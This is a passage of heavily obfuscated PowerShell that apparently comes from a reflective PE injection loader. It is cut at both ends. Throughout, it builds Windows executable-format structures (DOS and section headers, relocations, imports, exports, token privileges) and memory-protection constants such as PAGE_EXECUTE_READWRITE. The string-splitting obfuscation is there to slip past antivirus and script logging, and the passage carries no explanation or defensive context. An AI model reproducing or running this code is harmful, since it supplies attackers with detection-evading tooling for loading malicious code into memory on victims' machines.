		${TYp`ebuilD`Er}.("{1}{2}{0}{3}"-f'e','Define','Fi','ld').Invoke(("{0}{1}"-f'e_c','p'), [UInt16], ("{1}{0}" -f 'lic','Pub')) | &("{2}{0}{1}"-f'-Nul','l','Out')
		${t`yP`ebUiLder}.("{1}{0}{2}" -f 'fi','De','neField').Invoke(("{1}{0}"-f '_crlc','e'), [UInt16], ("{1}{0}" -f 'c','Publi')) | &("{0}{1}{2}"-f 'Out-','Nul','l')
		${Ty`p`EBUILDER}.("{2}{0}{1}" -f 'efineFi','eld','D').Invoke(("{0}{1}{3}{2}" -f'e_cpa','rh','r','d'), [UInt16], ("{1}{0}{2}" -f 'li','Pub','c')) | &("{2}{1}{0}" -f '-Null','ut','O')
		${TypeBU`I`lDEr}.("{2}{0}{3}{1}" -f 'eFi','ld','Defin','e').Invoke(("{0}{1}{2}" -f'e','_','minalloc'), [UInt16], ("{0}{2}{1}" -f 'Pub','ic','l')) | &("{1}{0}{2}"-f'ut-Nu','O','ll')
		${TYpebu`I`L`DER}.("{0}{3}{1}{2}" -f'De','neFiel','d','fi').Invoke(("{2}{0}{1}" -f 'l','loc','e_maxa'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | &("{0}{2}{1}"-f'Ou','ull','t-N')
		${t`YpE`BUi`LDEr}.("{2}{0}{1}"-f'eFiel','d','Defin').Invoke(("{1}{0}"-f 's','e_s'), [UInt16], ("{1}{0}" -f'blic','Pu')) | &("{0}{1}{2}"-f'Out-','Nu','ll')
		${T`Y`PE`BuiLDer}.("{0}{2}{1}" -f'Defi','ield','neF').Invoke(("{0}{1}"-f 'e','_sp'), [UInt16], ("{0}{1}{2}" -f'Pub','l','ic')) | &("{1}{2}{0}" -f '-Null','O','ut')
		${TYP`eBuIlD`eR}.("{0}{1}{2}" -f 'De','fineFie','ld').Invoke(("{0}{1}"-f'e_cs','um'), [UInt16], ("{0}{1}" -f 'Pub','lic')) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		${tyPeBU`I`LD`ER}.("{1}{2}{3}{0}"-f 'eField','D','efi','n').Invoke(("{0}{1}"-f'e_','ip'), [UInt16], ("{1}{0}" -f 'ic','Publ')) | &("{1}{0}"-f'l','Out-Nul')
		${T`y`pebuiLdeR}.("{2}{0}{1}{3}"-f'e','fi','D','neField').Invoke(("{1}{0}" -f's','e_c'), [UInt16], ("{1}{0}"-f'c','Publi')) | &("{0}{1}{2}" -f 'O','ut-','Null')
		${ty`PEB`UIL`Der}.("{0}{1}{3}{2}" -f 'D','efin','ield','eF').Invoke(("{1}{2}{0}"-f'c','e_lfar','l'), [UInt16], ("{0}{1}{2}" -f 'Publ','i','c')) | &("{0}{1}" -f'Out-','Null')
		${T`yPE`BUIl`DEr}.("{0}{1}{2}"-f 'Def','i','neField').Invoke(("{1}{0}" -f'_ovno','e'), [UInt16], ("{2}{1}{0}" -f 'ic','l','Pub')) | &("{1}{2}{0}" -f 'ull','Ou','t-N')

		${e`_`ReSfi`eld} = ${t`Y`p`ebuiLdEr}.("{2}{1}{3}{0}" -f 'eld','fi','De','neFi').Invoke(("{1}{0}" -f'res','e_'), [UInt16[]], ("{0}{6}{3}{5}{4}{2}{1}{7}" -f 'P','arsha','ieldM','blic,','F',' Has','u','l'))
		${Co`NSTrUcTO`RVa`L`Ue} =   (  Get-VARiABLE  ("Uztao"+"9")  -vALUEONl )::"b`YvALar`R`AY"
		${FIe`l`dARR`Ay} = @( ( CHiLDItem ('VA'+'riABl'+'E'+':BZN') ).VAlue.("{2}{0}{1}"-f 'e','tField','G').Invoke(("{0}{2}{1}"-f'Si','nst','zeCo')))
		${ATtr`I`BbuiLd`Er} = &("{2}{0}{1}"-f'e','w-Object','N') ("{3}{7}{2}{13}{8}{5}{1}{4}{12}{6}{0}{10}{9}{11}" -f 'tri','on.Emit','.','S','.Cust','cti','t','ystem','e','B','bute','uilder','omA','Refl')(${C`o`Nst`RucT`OriNfo}, ${C`o`NStRU`ctO`R`VaLuE}, ${fI`eLDAr`R`Ay}, @([Int32] 4))
		${e_`Res`FieLd}.("{0}{3}{1}{2}"-f 'SetCus','b','ute','tomAttri').Invoke(${atT`R`IBB`U`IldER})

		${tyP`E`BUIl`DeR}.("{2}{1}{0}"-f'eField','efin','D').Invoke(("{1}{0}" -f 'emid','e_o'), [UInt16], ("{1}{0}" -f 'ublic','P')) | &("{1}{0}" -f'll','Out-Nu')
		${tY`PEbU`iLder}.("{0}{2}{3}{1}"-f 'Def','eField','i','n').Invoke(("{0}{2}{1}"-f'e_oe','fo','min'), [UInt16], ("{2}{0}{1}" -f 'l','ic','Pub')) | &("{1}{0}{2}"-f't','Ou','-Null')

		${E_R`e`s2fiELD} = ${TYPEBU`Ild`er}.("{1}{0}{2}"-f 'ine','Def','Field').Invoke(("{0}{1}"-f'e_res','2'), [UInt16[]], ("{3}{2}{6}{4}{5}{1}{0}{7}" -f 'd','el','l','Pub',', Has','Fi','ic','Marshal'))
		${cOnst`Ruct`O`R`VaLUE} =   ${Uz`TaO9}::"BYva`lArr`Ay"
		${atTriBBu`I`LDEr} = &("{0}{1}{2}"-f'N','e','w-Object') ("{7}{0}{4}{2}{8}{3}{5}{6}{1}"-f 'm.Refl','r','o','Custo','ecti','mAttribut','eBuilde','Syste','n.Emit.')(${co`NStRuc`To`R`infO}, ${cO`NsT`R`UCtorVaLUe}, ${FiEld`Ar`RAY}, @([Int32] 10))
		${E_`RE`s2Fie`LD}.("{1}{2}{3}{0}{4}"-f 'ustomAt','Se','t','C','tribute').Invoke(${atT`R`ib`BU`IldeR})

		${t`YP`EbU`iLDer}.("{1}{0}{2}" -f 'ie','DefineF','ld').Invoke(("{0}{1}{2}"-f 'e','_lfane','w'), [Int32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}{2}" -f'ul','Out-N','l')
		${iMa`ge_dOs_`heaD`ER} = ${tyPEbUI`l`dEr}.("{2}{1}{0}" -f'teType','a','Cre').Invoke()	
		${w`In`32T`YpeS} | &("{2}{1}{0}" -f'mber','-Me','Add') -MemberType ("{2}{1}{3}{0}"-f'ty','Pro','Note','per') -Name ("{4}{2}{0}{1}{3}" -f 'OS_HEA','DE','GE_D','R','IMA') -Value ${I`M`A`gE_`dOs_hE`ADER}

		
		${a`Tt`Rib`UTes} = ("{1}{9}{3}{5}{21}{20}{11}{18}{15}{22}{12}{17}{2}{0}{14}{19}{8}{10}{4}{13}{6}{16}{7}" -f 'S','Aut','c, ','you','aled,','t','ieldI','t','ia','oLa','lLayout, Se','C','la',' BeforeF','equen',' ','ni','ss, Publi','lass,','t','nsi',', A','C')
		${T`yPeb`Uil`der} = ${m`odULeB`UIL`DEr}.("{2}{0}{3}{1}" -f 'efine','ype','D','T').Invoke(("{3}{0}{1}{2}" -f 'MAG','E_SECTION_HEADE','R','I'), ${A`TtriBuT`es}, [System.ValueType], 40)

		${n`AmEf`ie`lD} = ${tYpE`B`UiL`deR}.("{3}{1}{2}{0}"-f 'ield','ne','F','Defi').Invoke(("{1}{0}" -f 'e','Nam'), [Char[]], ("{2}{3}{0}{1}{4}"-f ', HasF','ieldMarsha','Pu','blic','l'))
		${Constru`cto`R`VaLUE} =  ${uZ`T`Ao9}::"byVA`La`Rr`AY"
		${ATtRI`BBU`iL`DER} = &("{2}{0}{1}"-f 'jec','t','New-Ob') ("{1}{9}{0}{6}{3}{4}{7}{5}{8}{2}" -f'.Emi','System.R','eBuilder','us','tomAttr','bu','t.C','i','t','eflection')(${C`oNsTRucTOrI`N`Fo}, ${CoNS`T`RuC`ToRvAL`UE}, ${FI`eL`DarrAy}, @([Int32] 8))
		${N`AMeF`IEld}.("{5}{3}{2}{0}{4}{1}"-f'ttr','ute','tomA','us','ib','SetC').Invoke(${Attr`I`B`BUIlDeR})

		${tY`pEB`UI`ldEr}.("{0}{1}{3}{2}"-f'De','fine','ld','Fie').Invoke(("{0}{2}{1}" -f 'Vir','lSize','tua'), [UInt32], ("{2}{0}{1}"-f 'li','c','Pub')) | &("{0}{1}" -f 'Out-Nu','ll')
		${t`yPebUi`LD`Er}.("{3}{1}{2}{0}"-f 'ld','fi','neFie','De').Invoke(("{0}{2}{3}{1}" -f'Vi','ss','rtu','alAddre'), [UInt32], ("{1}{0}{2}"-f 'ubl','P','ic')) | &("{0}{1}"-f'O','ut-Null')
		${TYPE`BU`ILD`ER}.("{1}{0}{2}"-f'ineFi','Def','eld').Invoke(("{1}{2}{0}" -f 'ata','Size','OfRawD'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{1}{2}{0}"-f 'l','Out-Nu','l')
		${t`Y`pEBui`LdEr}.("{1}{2}{0}" -f 'Field','De','fine').Invoke(("{2}{0}{1}{3}" -f'int','erToR','Po','awData'), [UInt32], ("{1}{0}{2}"-f 'i','Publ','c')) | &("{1}{0}{2}" -f'ut-Nu','O','ll')
		${TYp`e`BUIl`deR}.("{0}{3}{1}{2}"-f'De','e','Field','fin').Invoke(("{2}{1}{0}{3}{4}" -f'n','i','Po','terTo','Relocations'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{0}{2}{1}" -f'Ou','Null','t-')
		${typEBUI`l`D`eR}.("{0}{1}{2}" -f'D','efine','Field').Invoke(("{4}{0}{3}{2}{1}" -f'erToL','s','mber','inenu','Point'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		${typ`e`Bu`ilDER}.("{3}{1}{2}{0}" -f 'eld','efineF','i','D').Invoke(("{4}{0}{3}{2}{1}{5}"-f'u','c','rOfRelo','mbe','N','ations'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | &("{1}{0}"-f 'ull','Out-N')
		${tYp`e`BuiLdeR}.("{1}{0}{2}"-f'fine','De','Field').Invoke(("{6}{1}{0}{5}{2}{3}{4}"-f 'berOfLine','um','u','mb','ers','n','N'), [UInt16], ("{0}{1}{2}" -f'Pu','b','lic')) | &("{1}{0}{2}"-f'-Nu','Out','ll')
		${tyPe`B`U`iLdEr}.("{1}{2}{0}"-f 'ld','Defi','neFie').Invoke(("{3}{2}{1}{0}"-f'eristics','act','r','Cha'), [UInt32], ("{1}{2}{0}"-f 'c','Pu','bli')) | &("{1}{2}{0}"-f'l','Ou','t-Nul')
		${i`m`AGE_s`ec`TIOn_`hEa`DEr} = ${T`ypeBu`il`DeR}.("{2}{0}{1}"-f 'eateTy','pe','Cr').Invoke()
		${WIn32`T`YpEs} | &("{1}{2}{0}"-f 'Member','Add','-') -MemberType ("{2}{1}{0}" -f 'ty','Proper','Note') -Name ("{1}{2}{0}{3}"-f 'ION_','IMAGE_S','ECT','HEADER') -Value ${iMAge_sEc`T`IO`N_HE`A`DER}

		
		${ATt`R`IBUTes} = ("{18}{11}{5}{4}{0}{15}{12}{16}{17}{8}{9}{10}{13}{7}{14}{6}{19}{20}{1}{3}{2}" -f 'ss, ','eld','it','In','Cla','Layout, AnsiClass, ','led, Before','yout, S','qu','e','ntia','o','ubl','lLa','ea','P','ic',', Se','Aut','F','i')
		${tyPE`B`U`ILDer} = ${moD`ULEB`UI`ldER}.("{1}{2}{0}"-f'ineType','De','f').Invoke(("{3}{5}{4}{2}{0}{1}" -f 'CATIO','N','SE_RELO','IM','GE_BA','A'), ${a`TtriBu`T`ES}, [System.ValueType], 8)
		${typE`B`U`IlDer}.("{0}{2}{1}"-f'Defi','eField','n').Invoke(("{3}{0}{1}{2}" -f 'lA','ddres','s','Virtua'), [UInt32], ("{0}{2}{1}" -f'P','c','ubli')) | &("{2}{1}{0}" -f 'll','-Nu','Out')
		${typeb`U`ILd`er}.("{2}{3}{0}{1}" -f'neFi','eld','Def','i').Invoke(("{1}{0}{2}"-f'B','SizeOf','lock'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{2}{0}{1}" -f 'ut-N','ull','O')
		${IMAGE_bA`S`E`_r`el`OcAT`iON} = ${TyPeb`U`Ild`ER}.("{3}{0}{2}{1}"-f'r','ype','eateT','C').Invoke()
		${W`iN`32t`yPeS} | &("{2}{0}{1}" -f'be','r','Add-Mem') -MemberType ("{3}{1}{0}{2}"-f'P','te','roperty','No') -Name ("{1}{4}{0}{3}{2}" -f 'E_','IMAGE','OCATION','REL','_BAS') -Value ${iMage_b`A`se_RelO`CATi`On}

		
		${a`TTrIbuT`ES} = ("{9}{5}{4}{12}{2}{3}{6}{8}{17}{7}{14}{16}{0}{1}{10}{13}{15}{18}{11}"-f'out,',' Sealed,',' An','siC','ay','utoL','lass, C','ublic, ','la','A',' Befor','Init','out,','eF','Sequentia','ie','lLay','ss, P','ld')
		${TY`pE`BUIld`ER} = ${m`o`dulEbUIld`ER}.("{0}{3}{1}{2}"-f 'De','Ty','pe','fine').Invoke(("{3}{4}{2}{0}{1}"-f'T','OR','P','IMAGE_IMPORT_DESCR','I'), ${a`TtrIbu`T`Es}, [System.ValueType], 20)
		${T`ypEbU`I`ldER}.("{2}{1}{0}"-f 'd','l','DefineFie').Invoke(("{2}{1}{3}{0}"-f's','st','Characteri','ic'), [UInt32], ("{1}{0}" -f 'ic','Publ')) | &("{1}{2}{0}"-f'll','Out-','Nu')
		${TYpE`BUIld`Er}.("{1}{0}{2}" -f 'e','D','fineField').Invoke(("{1}{2}{0}"-f'tamp','TimeD','ateS'), [UInt32], ("{1}{0}"-f'lic','Pub')) | &("{1}{0}"-f 'Null','Out-')
		${TYPEbu`i`LD`er}.("{1}{0}{3}{2}"-f 'ne','Defi','d','Fiel').Invoke(("{1}{3}{2}{0}"-f 'n','Forw','erChai','ard'), [UInt32], ("{1}{2}{0}" -f'c','Pub','li')) | &("{0}{1}"-f 'Out-','Null')
		${t`YPeBu`iL`deR}.("{0}{2}{3}{1}" -f'D','Field','e','fine').Invoke(("{0}{1}" -f'Nam','e'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{1}{0}" -f 'ut-Null','O')
		${TypebU`ilD`Er}.("{3}{1}{2}{0}"-f'ld','eF','ie','Defin').Invoke(("{0}{1}{2}" -f'FirstTh','un','k'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{1}{0}" -f 't-Null','Ou')
		${Im`AgE_`imPoR`T`_dESCrip`T`or} = ${tyPEB`Ui`ld`Er}.("{0}{2}{1}"-f'C','eType','reat').Invoke()
		${W`In`32`Types} | &("{1}{3}{2}{0}"-f 'er','A','emb','dd-M') -MemberType ("{3}{1}{0}{2}"-f'per','otePro','ty','N') -Name ("{2}{1}{0}{3}" -f 'IMPORT_D','MAGE_','I','ESCRIPTOR') -Value ${iMagE_`Im`POrt`_d`esCripToR}

		
		${AT`T`RIB`Utes} = ("{19}{8}{17}{12}{13}{14}{16}{5}{15}{1}{4}{18}{2}{9}{11}{6}{10}{3}{0}{7}" -f 'f','s',' Seque','e',', Publi','l','lLayout,','oreFieldInit','ut','n',' Sealed, B','tia','t,',' ','An','ass, Clas','siC','oLayou','c,','A')
		${t`YpEBui`L`dER} = ${ModuLEB`UI`L`dER}.("{3}{1}{0}{2}"-f 'Ty','e','pe','Defin').Invoke(("{0}{1}{3}{2}{4}" -f 'I','M','T_','AGE_EXPOR','DIRECTORY'), ${A`TtrIB`U`TES}, [System.ValueType], 40)
		${tyP`Eb`UILdEr}.("{0}{2}{1}" -f'D','ield','efineF').Invoke(("{0}{3}{2}{4}{1}"-f 'Ch','cs','racteris','a','ti'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{2}{0}{1}"-f 'Nul','l','Out-')
		${t`yPeBu`IL`deR}.("{0}{1}{2}{3}" -f'Defi','neFi','el','d').Invoke(("{3}{1}{0}{4}{2}"-f'Dat','me','Stamp','Ti','e'), [UInt32], ("{0}{1}{2}"-f'P','ub','lic')) | &("{0}{1}{2}" -f'Out-Nu','l','l')
		${Ty`P`eB`UILdeR}.("{1}{2}{0}" -f'ld','Define','Fie').Invoke(("{0}{1}{2}{3}" -f 'Ma','jorVe','r','sion'), [UInt16], ("{1}{0}"-f'ublic','P')) | &("{1}{0}{2}" -f 't','Ou','-Null')
		${t`YpEB`UiL`DER}.("{0}{2}{1}"-f 'DefineF','ld','ie').Invoke(("{2}{3}{1}{0}"-f'ion','s','Mino','rVer'), [UInt16], ("{2}{1}{0}"-f'lic','b','Pu')) | &("{2}{1}{0}"-f 'Null','ut-','O')
		${t`YP`EbUi`LdER}.("{1}{2}{0}"-f 'Field','De','fine').Invoke(("{0}{1}"-f 'N','ame'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}"-f'ut-Null','O')
		${t`y`pEB`UiLDeR}.("{2}{0}{3}{1}" -f 'fineFie','d','De','l').Invoke(("{0}{1}"-f'Ba','se'), [UInt32], ("{0}{1}"-f 'Pu','blic')) | &("{2}{1}{0}" -f'll','t-Nu','Ou')
		${T`YPE`Bu`IldER}.("{0}{2}{3}{1}"-f 'Def','ld','ine','Fie').Invoke(("{4}{1}{5}{2}{0}{3}"-f 't','mber','unc','ions','Nu','OfF'), [UInt32], ("{2}{0}{1}" -f 'bli','c','Pu')) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
		${tyPe`B`U`ilDER}.("{0}{2}{3}{1}" -f 'D','d','efi','neFiel').Invoke(("{0}{1}{4}{2}{3}" -f 'Num','b','me','s','erOfNa'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{0}{2}{1}"-f 'Out','ull','-N')
		${TY`pEb`Ui`lDeR}.("{3}{2}{0}{1}" -f 'ineFie','ld','ef','D').Invoke(("{3}{1}{4}{2}{0}" -f's','es','unction','Addr','sOfF'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{0}{1}" -f'Out-Nu','ll')
		${tYP`EBu`ILDeR}.("{1}{0}{2}" -f'ine','Def','Field').Invoke(("{3}{1}{4}{2}{0}"-f'es','es','am','Addr','sOfN'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{0}{2}{1}"-f 'Out','l','-Nul')
		${typ`eb`UIL`DEr}.("{3}{0}{2}{1}" -f 'e','neField','fi','D').Invoke(("{2}{5}{0}{1}{3}{4}"-f'OfN','ameOr','Addr','dinal','s','ess'), [UInt32], ("{0}{1}{2}"-f 'P','ubl','ic')) | &("{1}{2}{0}" -f 'll','Out-','Nu')
		${ima`ge_e`xpo`RT`_DirEc`TORY} = ${t`yPEBU`I`Lder}.("{0}{2}{1}"-f 'Cre','e','ateTyp').Invoke()
		${WI`N32TYP`eS} | &("{1}{2}{0}" -f 'ber','Add-M','em') -MemberType ("{2}{0}{1}"-f'rop','erty','NoteP') -Name ("{4}{2}{1}{3}{6}{0}{5}" -f'E','EX','AGE_','POR','IM','CTORY','T_DIR') -Value ${IMa`gE_e`xPo`RT`_`Di`RECTOrY}
		
		
		${a`TTRI`BUteS} = ("{4}{15}{20}{12}{7}{11}{8}{10}{13}{9}{18}{0}{14}{19}{5}{17}{21}{16}{6}{2}{1}{3}"-f' Public, Sequ','eldIn','eFi','it','AutoLayo',', ','r','Cl','ss','ass',',','a','nsi',' Cl','entia','ut','d, Befo','Sea',',','lLayout',', A','le')
		${t`y`peBuIL`der} = ${MoDul`EbuI`L`d`ER}.("{2}{3}{0}{1}"-f'Typ','e','Defin','e').Invoke(("{1}{0}"-f 'ID','LU'), ${A`TT`RIb`UTeS}, [System.ValueType], 8)
		${T`YpeBU`ILDeR}.("{1}{0}{2}{3}"-f'f','De','ine','Field').Invoke(("{1}{0}" -f'rt','LowPa'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}"-f't-','Ou','Null')
		${tyPe`Bu`I`LdEr}.("{1}{3}{0}{2}"-f'e','D','Field','efin').Invoke(("{0}{2}{1}"-f'H','t','ighPar'), [UInt32], ("{0}{1}{2}"-f 'P','ubl','ic')) | &("{1}{0}{2}"-f'N','Out-','ull')
		${lu`iD} = ${t`Y`PEbuIl`der}.("{2}{1}{0}" -f 'ype','eateT','Cr').Invoke()
		${w`in32T`YpeS} | &("{0}{2}{1}" -f'Ad','-Member','d') -MemberType ("{1}{2}{0}" -f 'erty','N','oteProp') -Name ("{1}{0}"-f'ID','LU') -Value ${lu`iD}
		
		
		${a`TtR`iBUTeS} = ("{3}{9}{1}{17}{10}{4}{12}{19}{5}{11}{15}{6}{20}{14}{7}{8}{16}{2}{13}{18}{21}{0}"-f 'nit','nsiCl','efor','AutoL','s','Public, ','en','le','d, ','ayout, A',', Cla','S','s,','e','ialLayout, Sea','equ','B','ass','Field',' ','t','I')
		${tY`PEbUIL`DEr} = ${m`Od`ULe`B`UilDer}.("{3}{1}{0}{2}" -f'ne','fi','Type','De').Invoke(("{3}{1}{0}{4}{2}" -f'TRI','D_AT','UTES','LUID_AN','B'), ${aTTR`IBu`TeS}, [System.ValueType], 12)
		${TypE`BU`IlD`eR}.("{1}{3}{0}{2}"-f'ne','Def','Field','i').Invoke(("{0}{1}" -f'L','uid'), ${l`UId}, ("{0}{1}"-f'P','ublic')) | &("{1}{2}{0}" -f'ull','Ou','t-N')
		${ty`PE`Bu`iLdeR}.("{1}{3}{0}{2}"-f 'i','Defi','eld','neF').Invoke(("{2}{0}{1}" -f'ib','utes','Attr'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{0}{1}" -f 'Out','-Null')
		${l`UID`_`A`ND_AtTRIBuT`eS} = ${TYPebu`IL`DEr}.("{1}{2}{0}" -f'ype','Crea','teT').Invoke()
		${w`IN32Ty`peS} | &("{1}{0}{2}" -f'd-Memb','Ad','er') -MemberType ("{1}{2}{3}{0}" -f 'erty','NotePr','o','p') -Name ("{3}{0}{1}{2}" -f'UID','_AND_ATTRI','BUTES','L') -Value ${LU`Id_AND_ATTr`i`BU`T`eS}
		
		
		${at`TRIb`UtEs} = ("{17}{18}{16}{1}{11}{5}{2}{0}{19}{12}{15}{6}{21}{7}{3}{10}{9}{14}{13}{8}{4}{20}"-f 's, Cl','Layout, ','as',', Seale','ldI','l',' Sequential','t','oreFie',',','d','AnsiC','ub','Bef',' ','lic,','o','Au','t','ass, P','nit','Layou')
		${TypebU`Il`dER} = ${MOd`ULeB`UilDeR}.("{0}{2}{1}" -f'Def','ype','ineT').Invoke(("{3}{1}{2}{0}"-f 'VILEGES','OK','EN_PRI','T'), ${a`T`TribuT`es}, [System.ValueType], 16)
		${TypEbui`L`dER}.("{1}{0}{2}"-f 'fineFiel','De','d').Invoke(("{2}{0}{1}{3}"-f 'rivilegeCo','un','P','t'), [UInt32], ("{1}{2}{0}" -f'c','Pu','bli')) | &("{1}{2}{0}" -f '-Null','O','ut')
		${T`ypebu`iLd`ER}.("{0}{1}{2}{3}"-f 'De','f','in','eField').Invoke(("{1}{2}{0}" -f 's','Privileg','e'), ${lui`d_ANd`_A`TtRIBuT`ES}, ("{1}{0}" -f 'ic','Publ')) | &("{2}{1}{0}"-f 'l','l','Out-Nu')
		${to`ken`_p`RivilEgeS} = ${T`Y`PEBUIldEr}.("{1}{2}{0}" -f'eType','Cre','at').Invoke()
		${W`In3`2T`YpeS} | &("{0}{1}{3}{2}"-f 'Add-','Me','r','mbe') -MemberType ("{1}{3}{0}{2}"-f't','NotePr','y','oper') -Name ("{3}{1}{0}{4}{2}" -f '_PRI','OKEN','ES','T','VILEG') -Value ${Toke`N_PriviLE`G`Es}

		return ${wIn`32tYp`Es}
	}

	Function gE`T-w`I`N`32CoNsta`NtS
	{
		${w`in32`coNstAn`Ts} = &("{0}{1}{2}" -f'Ne','w-Objec','t') ("{1}{0}{2}{3}"-f 'te','Sys','m.Objec','t')
		
		${wi`N32CoN`s`TAn`TS} | &("{0}{2}{1}{3}"-f 'Add','Mem','-','ber') -MemberType ("{2}{0}{1}"-f 'P','roperty','Note') -Name ("{1}{0}{3}{2}" -f'E','M','OMMIT','M_C') -Value 0x00001000
		${wI`N`32co`Ns`TantS} | &("{1}{3}{2}{0}"-f'ber','Ad','Mem','d-') -MemberType ("{1}{2}{0}{3}"-f'pe','Note','Pro','rty') -Name ("{1}{3}{2}{0}" -f'SERVE','ME','E','M_R') -Value 0x00002000
		${wIn3`2`coNST`Ants} | &("{2}{1}{3}{0}"-f 'ber','d-','Ad','Mem') -MemberType ("{0}{3}{1}{2}" -f'No','rope','rty','teP') -Name ("{0}{3}{2}{1}"-f 'PAGE_','S','CCES','NOA') -Value 0x01
		${W`IN32cO`NstaN`Ts} | &("{1}{0}{2}" -f 'd-Membe','Ad','r') -MemberType ("{2}{1}{0}"-f 'y','ert','NoteProp') -Name ("{0}{1}{2}"-f 'PAGE','_REA','DONLY') -Value 0x02
		${WI`N32`c`ONstAN`TS} | &("{0}{3}{2}{1}" -f 'Add','er','Memb','-') -MemberType ("{0}{2}{1}"-f'Note','y','Propert') -Name ("{1}{0}{3}{2}"-f'E_READW','PAG','ITE','R') -Value 0x04
		${w`iN32`c`onStAnTS} | &("{3}{1}{0}{2}" -f'e','-M','mber','Add') -MemberType ("{3}{2}{1}{0}" -f'rty','e','teProp','No') -Name ("{3}{0}{2}{1}" -f 'AGE_WRI','COPY','TE','P') -Value 0x08
		${wI`N32ConStA`NtS} | &("{2}{1}{0}"-f'er','emb','Add-M') -MemberType ("{0}{1}{2}"-f 'N','otePropert','y') -Name ("{1}{0}{3}{2}"-f'_E','PAGE','E','XECUT') -Value 0x10
		${Win`3`2cONS`Ta`NtS} | &("{1}{2}{0}"-f'ber','Add-','Mem') -MemberType ("{1}{2}{0}"-f'erty','NoteP','rop') -Name ("{4}{2}{1}{0}{3}"-f 'ECUT','X','_E','E_READ','PAGE') -Value 0x20
		${wi`N32`co`Nst`ANts} | &("{2}{1}{0}" -f'Member','-','Add') -MemberType ("{1}{0}{2}" -f'te','No','Property') -Name ("{4}{2}{0}{3}{6}{1}{5}" -f'_R','WRIT','E_EXECUTE','E','PAG','E','AD') -Value 0x40
		${win`32CoNsTA`NtS} | &("{0}{3}{2}{1}"-f 'Add','ber','em','-M') -MemberType ("{2}{1}{3}{0}" -f 'y','oteProper','N','t') -Name ("{5}{0}{2}{3}{4}{1}"-f 'E_W','PY','R','ITE','CO','PAGE_EXECUT') -Value 0x80
		${wi`N3`2C`oNSt`ANts} | &("{2}{0}{1}" -f 'd-M','ember','Ad') -MemberType ("{2}{3}{0}{1}"-f'eProp','erty','No','t') -Name ("{1}{2}{0}"-f'E_NOCACHE','P','AG') -Value 0x200
		${wiN`32`CoNs`T`ANtS} | &("{0}{3}{2}{1}"-f'Ad','mber','Me','d-') -MemberType ("{0}{2}{1}{3}"-f'Not','rt','ePrope','y') -Name ("{5}{4}{0}{2}{6}{3}{1}" -f'GE_R','SOLUTE','EL_','_AB','MA','I','BASED') -Value 0
		${WIN32`cOn`S`TANTs} | &("{2}{1}{0}"-f 'Member','d-','Ad') -MemberType ("{0}{3}{1}{2}" -f'NotePr','rt','y','ope') -Name ("{1}{0}{5}{3}{2}{4}"-f'AGE_','IM','L','E','_BASED_HIGHLOW','R') -Value 3
		${WiN`32Con`S`TANTs} | &("{0}{1}{2}"-f'A','dd','-Member') -MemberType ("{0}{1}{3}{2}"-f 'Note','P','ty','roper') -Name ("{3}{5}{4}{0}{2}{1}{6}" -f 'D','R','I','IMAGE','_','_REL_BASED','64') -Value 10
		${wIn`32`coNS`TA`Nts} | &("{2}{0}{1}"-f 'Me','mber','Add-') -MemberType ("{0}{2}{1}{3}" -f'No','ope','tePr','rty') -Name ("{5}{1}{4}{6}{3}{2}{0}" -f 'DABLE','_','M_DISCAR','_ME','SC','IMAGE','N') -Value 0x02000000
		${W`iN32c`On`sTa`Nts} | &("{0}{1}{2}{3}"-f'Ad','d-M','emb','er') -MemberType ("{0}{2}{1}"-f 'Note','perty','Pro') -Name ("{3}{4}{2}{0}{6}{1}{5}"-f'M','EXECUT','_SCN_','I','MAGE','E','EM_') -Value 0x20000000
		${WIn3`2ConSTA`N`Ts} | &("{2}{1}{0}{3}"-f'e','dd-Memb','A','r') -MemberType ("{1}{2}{0}"-f'erty','Note','Prop') -Name ("{3}{4}{2}{1}{0}"-f'D','MEM_REA','SCN_','I','MAGE_') -Value 0x40000000
		${WIN`32`cO`NSTan`Ts} | &("{2}{1}{0}" -f 'er','Memb','Add-') -MemberType ("{2}{1}{0}"-f 'ty','er','NoteProp') -Name ("{1}{2}{3}{5}{0}{4}"-f '_MEM_WR','IMAG','E','_','ITE','SCN') -Value 0x80000000
		${W`iN32cOns`Ta`NTS} | &("{0}{2}{1}"-f 'Add','ber','-Mem') -MemberType ("{3}{2}{1}{0}"-f'operty','r','P','Note') -Name ("{0}{1}{3}{5}{4}{2}"-f 'IMAG','E_SCN_MEM','CHED','_N','T_CA','O') -Value 0x04000000
		${W`in32CoNS`TaN`TS} | &("{3}{2}{1}{0}" -f'ber','Mem','-','Add') -MemberType ("{0}{1}{2}{3}"-f'No','tePr','oper','ty') -Name ("{2}{0}{1}"-f'DE','COMMIT','MEM_') -Value 0x4000
		${WIn3`2C`onSt`AnTs} | &("{0}{1}{3}{2}" -f 'Add','-M','ber','em') -MemberType ("{0}{3}{2}{1}"-f'NotePro','ty','r','pe') -Name ("{0}{2}{6}{5}{3}{4}{1}"-f 'IMA','GE','GE_FIL','BLE_I','MA','A','E_EXECUT') -Value 0x0002
		${w`iN32CoNst`ANts} | &("{1}{2}{0}" -f 'mber','Add-','Me') -MemberType ("{2}{0}{1}"-f 'ote','Property','N') -Name ("{0}{1}{3}{2}" -f'IMAGE','_F','_DLL','ILE') -Value 0x2000
		${w`I`N`32cONsTA`NtS} | &("{0}{2}{1}"-f'Add','ber','-Mem') -MemberType ("{3}{1}{0}{2}"-f'r','P','operty','Note') -Name ("{1}{2}{4}{3}{5}{6}{0}"-f 'ASE','IMAGE_DLLCHARACT','ERI','C','STI','S_DYNAMIC','_B') -Value 0x40
